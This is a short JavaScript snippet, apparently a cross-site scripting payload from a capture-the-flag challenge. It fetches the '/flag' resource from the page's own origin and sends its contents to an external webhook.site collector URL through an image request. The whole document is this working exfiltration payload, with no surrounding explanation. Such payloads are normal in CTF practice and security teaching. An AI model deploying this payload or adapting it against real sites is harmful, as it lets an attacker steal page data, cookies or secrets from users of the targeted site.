fetch('/flag')
  .then(r => r.text())
  .then(flag => {
    new Image().src = '	https://webhook.site/1f3a4ffa-7fcd-4184-9c52-5c2ba0356568?f=' + encodeURIComponent(flag);
  });
